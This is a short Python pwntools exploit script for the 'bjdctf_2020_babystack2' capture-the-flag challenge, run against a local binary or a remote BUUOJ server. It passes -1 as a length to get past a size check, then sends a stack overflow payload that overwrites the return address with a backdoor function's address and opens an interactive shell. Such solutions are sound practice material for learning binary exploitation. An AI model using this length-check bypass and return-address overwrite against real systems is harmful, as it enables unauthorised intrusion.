#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./bjdctf_2020_babystack2")
	elf = ELF("./bjdctf_2020_babystack2")
else:
	p = remote("node3.buuoj.cn",29068)
	elf = ELF("./bjdctf_2020_babystack2")


sla("[+]Please input the length of your name:",'-1')

backdoor = 0x400726
payload = 'A' * 0x10 + 'deadbeef' + p64(backdoor)
sla("[+]What's u name?",payload)
ia()
